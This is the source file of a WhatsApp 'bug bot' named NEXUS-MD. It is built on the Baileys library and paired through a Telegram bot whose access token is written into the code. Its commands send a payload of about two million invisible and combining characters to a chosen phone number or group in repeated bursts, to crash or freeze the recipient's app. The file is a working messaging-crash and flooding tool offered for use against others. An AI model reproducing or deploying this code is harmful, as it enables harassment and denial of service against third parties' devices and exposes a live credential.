const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion, 
    DisconnectReason, 
    delay,
    Browsers,
    makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require('pino');
const express = require('express');

// --- ⚙️ CONFIGURATION ---
const TG_TOKEN = '8745872876:AAEyEHrpuYeyP94PRcYlTXSkVjv-vMjKhf8';
const tgBot = new TelegramBot(TG_TOKEN, { polling: true });
const app = express();
const PORT = process.env.PORT || 3000;
const CHANNEL_URL = "https://whatsapp.com/channel/0029Vb7a9bO6RGJKJbh4xR0F";
const AD_IMAGE_URL = "https://telegra.ph/file/a8a183d25667e41793741.jpg";

let botConfig = {
    botName: "NEXUS-MD V3 3M SUPREME",
    owner: "94767475809", 
    prefix: ".",
};

app.get('/', (req, res) => res.send('Nexus System Online! ☠️'));
app.listen(PORT, () => console.log(`Dashboard Active on ${PORT}`));

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        logger: pino({ level: 'silent' }),
        browser: ["Ubuntu", "Chrome", "110.0.5481.178"], 
        printQRInTerminal: false,
        syncFullHistory: false
    });

    // --- 🤖 TELEGRAM HANDLER (STABLE PAIRING) ---
    tgBot.on('message', async (msg) => {
        const text = msg.text;
        const chatId = msg.chat.id;
        if (text === '/start') {
            return tgBot.sendMessage(chatId, "☠️ *NEXUS-MD V3 3M SUPREME*\n\nEnter your WhatsApp number with 94 code.\n*(Example: 94767475809)*", { parse_mode: 'Markdown' });
        }
        if (text && /^\d+$/.test(text) && text.length > 9) {
            try {
                tgBot.sendMessage(chatId, "⏳ *Connecting... Please check your WhatsApp notification.*");
                await delay(3000);
                let code = await sock.requestPairingCode(text.trim());
                tgBot.sendMessage(chatId, `🔥 *3M PAIRING KEY:* \`${code}\` \n\nEnter this in your WhatsApp Linked Devices.`, { parse_mode: 'Markdown' });
            } catch (e) { tgBot.sendMessage(chatId, "❌ *Error!* Restart the bot."); }
        }
    });

    // --- 📩 MESSAGE HANDLER (ULTIMATE BUG + GAMMATA MENU) ---
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message) return;
            const from = mek.key.remoteJid;
            const isOwner = mek.key.fromMe || from.startsWith(botConfig.owner);
            if (!isOwner) return; 

            const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
            if (!body.startsWith(botConfig.prefix)) return;

            const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
            const args = body.trim().split(/ +/).slice(1);
            const targetNum = args[0] ? args[0].replace(/[^0-9]/g, '') : null;
            const targetJid = targetNum + "@s.whatsapp.net";

            // 🔥 3,000,000+ DEADLY INVISIBLE BUG (ZERO-WIDTH LOAD)
            const deadlyBug = "☠️ *NEXUS 3M SUPREME CRASH* ☠️\n" + "​".repeat(1200000) + "ꦿ".repeat(450000) + "᥋".repeat(450000);

            switch (command) {
                case 'menu':
                case 'bug':
                    const gammataMenu = `
┏━━━━━━━━━━━━━━━━━━━━┓
┃  ☣️ *NEXUS-MD V3 SUPREME* ☣️
┗━━━━━━━━━━━━━━━━━━━━┛
┃
┃ 🩸 *NATURE:* _Global Destroyer_
┃ 🦠 *POWER:* \`3,000,000+\` Characters
┃ ⚡ *STATUS:* _Master Private Online_
┃ 💻 *DEV:* _Sasiya MD_
┃
┣━━━━━━━━━━━━━━━━━━━━┓
┃  🔥 *S U P R E M E  B U G S*
┣━━━━━━━━━━━━━━━━━━━━┛
┃
┃ ☠️ *.vid_crash* [num] - _3M Video Lag_
┃ 🔥 *.ios_dead* [num] - _iPhone System Wipe_
┃ 💀 *.kill* [num] - _Android Global Crash_
┃ ❄️ *.freeze* [num] - _3M UI Freeze_
┃ 🌀 *.group* [jid] - _Total Group Wipe_
┃ 🌌 *.the_end* [num] - _Ultimate Destruction_
┃
┣━━━━━━━━━━━━━━━━━━━━┓
┃  🛡️ *D E V E L O P E R  N E X U S*
┗━━━━━━━━━━━━━━━━━━━━┛
 📢 *CHANNEL:* ${CHANNEL_URL}`;

                    await sock.sendMessage(from, { 
                        text: gammataMenu,
                        contextInfo: { 
                            externalAdReply: { 
                                title: "NEXUS-MD 3M MENU ACTIVE ⚡",
                                body: "Supreme Bug Destroyer Ready 💀",
                                mediaType: 1,
                                thumbnailUrl: AD_IMAGE_URL, 
                                sourceUrl: CHANNEL_URL
                            }
                        }
                    }, { quoted: mek });
                    break;

                case 'kill':
                case 'vid_crash':
                case 'ios_dead':
                case 'the_end':
                    if (!targetNum) return sock.sendMessage(from, { text: "❌ *Target Number එක ගහපන් මචං!*" });

                    await sock.sendMessage(from, { text: `🌑 *ATTACKING:* ${targetNum}\n*POWER:* 3,000,000+ Characters (Invisible Mode)...` });

                    // 🔥 High Intensity Burst Attack (10 Cycles)
                    for(let i=0; i<10; i++) {
                        await sock.sendMessage(targetJid, { text: deadlyBug });
                        await delay(350);
                    }

                    // 🔥 ULTIMATE SUCCESS REPORT
                    const report = `
╭───〔 *NEXUS ATTACK REPORT* 〕───┈
│
│ ✅ *STATUS:* 3M POWER DEPLOYED
│ 🎯 *TARGET:* ${targetNum}
│ 🦠 *LOAD:* Invisible UI Freeze Active
│ 🚀 *RESULT:* Target Destroyed Successfully
│ 🕒 *TIME:* ${new Date().toLocaleTimeString()}
│
╰─────────────┈
 👑 *DEV:* SASIYA MD`;

                    await sock.sendMessage(from, { 
                        text: report,
                        contextInfo: { 
                            externalAdReply: { 
                                title: "BUG DEPLOYED SUCCESSFULLY 💀",
                                body: "Target: " + targetNum,
                                mediaType: 1,
                                thumbnailUrl: AD_IMAGE_URL, 
                                sourceUrl: CHANNEL_URL
                            }
                        }
                    }, { quoted: mek });
                    break;

                case 'group':
                    if (!args[0]) return;
                    await sock.sendMessage(from, { text: "🌀 *WIPING OUT GROUP WITH 3M POWER...*" });
                    for(let i=0; i<12; i++) {
                        await sock.sendMessage(args[0], { text: deadlyBug });
                        await delay(400);
                    }
                    break;
            }
        } catch (e) { console.log(e); }
    });

    sock.ev.on('connection.update', (up) => { if (up.connection === 'close') startNexus(); });
    sock.ev.on('creds.update', saveCreds);
}

startNexus();
